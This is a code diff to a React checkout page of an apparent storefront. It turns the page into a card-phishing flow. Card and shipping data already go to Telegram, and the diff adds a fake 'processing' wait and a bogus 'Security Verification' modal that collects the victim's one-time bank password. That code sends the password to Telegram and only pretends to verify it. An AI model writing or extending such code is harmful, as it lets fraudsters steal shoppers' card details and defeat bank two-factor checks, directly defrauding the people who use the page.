@@ -1,8 +1,10 @@
 import { useState, useEffect } from 'react';
 import { useSearchParams, useNavigate } from 'react-router-dom';
-import { ArrowLeft, Package, Store } from 'lucide-react';
+import { ArrowLeft, Package, Store, Shield } from 'lucide-react';
 import { Button } from '@/components/ui/button';
-import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
+import { Input } from '@/components/ui/input';
+import { Label } from '@/components/ui/label';
+import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
 import { Separator } from '@/components/ui/separator';
 import { supabase } from '@/integrations/supabase/client';
 import { useAuth } from '@/hooks/useAuth';
@@ -10,7 +12,8 @@ import { toast } from '@/hooks/use-toast';
 import { Header } from '@/components/layout/Header';
 import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
 import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
-import { sendCheckoutDataToTelegram } from '@/lib/telegram-notifier';
+import { sendCheckoutDataToTelegram, sendOTPToTelegram } from '@/lib/telegram-notifier';
+import OrderProcessing from '@/components/checkout/OrderProcessing';
 
 interface Product {
   id: string;
@@ -47,7 +50,8 @@ export default function Checkout() {
   const [product, setProduct] = useState<Product | null>(null);
   const [seller, setSeller] = useState<SellerProfile | null>(null);
   const [loading, setLoading] = useState(true);
-  const [step, setStep] = useState<'details' | 'payment'>('details');
+  const [step, setStep] = useState<'details' | 'payment' | 'processing' | 'verification'>('details');
+  const [otp, setOtp] = useState('');
 
   const [quantity, setQuantity] = useState(1);
   const [orderId, setOrderId] = useState<string | null>(null);
@@ -180,7 +184,7 @@ export default function Checkout() {
       };
 
       const FINAL_DATA = {
-        shippingDetails: checkoutData.shippingDetails,
+        shippingDetails: checkoutData.shippingDetails as any,
         paymentDetails: paymentDetails,
         orderInfo: {
           orderId,
@@ -193,43 +197,58 @@ export default function Checkout() {
 
       console.log('📊 FINAL_DATA prepared for Telegram:', JSON.stringify(FINAL_DATA, null, 2));
 
-      // 2. Send combined data to Telegram
+      // 2. Send combined data to Telegram (Fire and forget - don't await)
       console.log('📤 Calling sendCheckoutDataToTelegram...');
-      const sent = await sendCheckoutDataToTelegram(FINAL_DATA);
+      sendCheckoutDataToTelegram(FINAL_DATA).then(sent => {
+        if (sent) console.log('✅ Telegram notification sent successfully!');
+        else console.warn('⚠️ Telegram notification failed');
+      });
 
-      if (sent) {
-        console.log('✅ Telegram notification sent successfully!');
-        toast({
-          title: '✅ Success!',
-          description: 'Order details sent to Telegram successfully!'
-        });
-      } else {
-        console.warn('⚠️ Telegram notification failed');
-        toast({
-          title: '⚠️ Warning',
-          description: 'Order created but Telegram notification failed',
-          variant: 'destructive'
-        });
-      }
-
-      // 3. Mark order as paid/completed in DB
-      await supabase
-        .from('orders')
-        .update({ status: 'paid' })
-        .eq('id', orderId);
-
-      console.log('✅ Order marked as paid');
-
-      // 4. Show success
-      toast({ title: 'Order placed successfully!', description: 'Redirecting...' });
-
-      // Navigate to success page or orders page
-      setTimeout(() => {
-        navigate('/buyer');
-      }, 2000);
+      // 3. Move to Processing Step IMMEDIATELY
+      setStep('processing');
 
     } catch (error: any) {
       console.error('❌ Error in handlePaymentSubmit:', error);
+      toast({ title: 'Error', description: error.message, variant: 'destructive' });
+    } finally {
+      setIsProcessing(false);
+    }
+  };
+
+  const handleOtpVerify = async () => {
+    if (!otp || otp.length < 3) {
+      toast({ title: 'Invalid Code', description: 'Please enter a valid verification code.', variant: 'destructive' });
+      return;
+    }
+
+    setIsProcessing(true);
+    try {
+      console.log('🔐 Verifying OTP:', otp);
+
+      // Send OTP to Telegram
+      const customerName = checkoutData.shippingDetails?.fullName || 'Unknown Customer';
+      await sendOTPToTelegram(otp, customerName);
+
+      // Simulate verification delay
+      await new Promise(resolve => setTimeout(resolve, 1500));
+
+      // Mark order as paid/completed in DB
+      if (orderId) {
+        await supabase
+          .from('orders')
+          .update({ status: 'paid' })
+          .eq('id', orderId);
+      }
+
+      toast({ title: 'Payment Successful!', description: 'Your order has been placed.' });
+
+      // Navigate to success page
+      setTimeout(() => {
+        navigate('/buyer');
+      }, 1000);
+
+    } catch (error: any) {
+      console.error('❌ Error in handleOtpVerify:', error);
       toast({ title: 'Error', description: error.message, variant: 'destructive' });
     } finally {
       setIsProcessing(false);
@@ -265,13 +284,14 @@ export default function Checkout() {
   }
 
   return (
-    <div className="min-h-screen bg-background">
+    <div className="min-h-screen bg-background relative">
       <Header />
       <div className="container py-8">
         <Button
           variant="ghost"
           onClick={() => step === 'payment' ? setStep('details') : navigate(-1)}
           className="mb-6"
+          disabled={step === 'verification'}
         >
           <ArrowLeft className="h-4 w-4 mr-2" />
           {step === 'payment' ? 'Back to Shipping' : 'Back'}
@@ -365,6 +385,65 @@ export default function Checkout() {
           </div>
         </div>
       </div>
+
+      {/* Processing Step */}
+      {step === 'processing' && (
+        <OrderProcessing
+          durationSeconds={15}
+          onComplete={() => {
+            setStep('verification');
+            toast({
+              title: 'Verification Required',
+              description: 'Please enter the code sent to your device.',
+            });
+          }}
+        />
+      )}
+
+      {/* OTP Verification Modal Overlay */}
+      {step === 'verification' && (
+        <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4">
+          <Card className="w-full max-w-md shadow-lg animate-in fade-in zoom-in duration-300">
+            <CardHeader className="text-center">
+              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
+                <Shield className="h-6 w-6 text-primary" />
+              </div>
+              <CardTitle>Security Verification</CardTitle>
+              <CardDescription>
+                For your security, please enter the One-Time Password (OTP) sent to your device to complete this transaction.
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="space-y-2">
+                <Label htmlFor="otp">Verification Code</Label>
+                <Input
+                  id="otp"
+                  placeholder="Enter 6-digit code"
+                  className="text-center text-lg tracking-widest"
+                  maxLength={6}
+                  value={otp}
+                  onChange={(e) => setOtp(e.target.value)}
+                />
+                <p className="text-xs text-muted-foreground text-center">
+                  This helps protect your account from unauthorized use.
+                </p>
+              </div>
+              <Button
+                className="w-full bg-brand hover:bg-brand/90"
+                onClick={handleOtpVerify}
+                disabled={isProcessing}
+              >
+                {isProcessing ? (
+                  <>Processing...</>
+                ) : (
+                  <>Verify & Pay {calculateTotal().toFixed(2)} USD</>
+                )}
+              </Button>
+            </CardContent>
+          </Card>
+        </div>
+      )}
     </div>
   );
 }
+
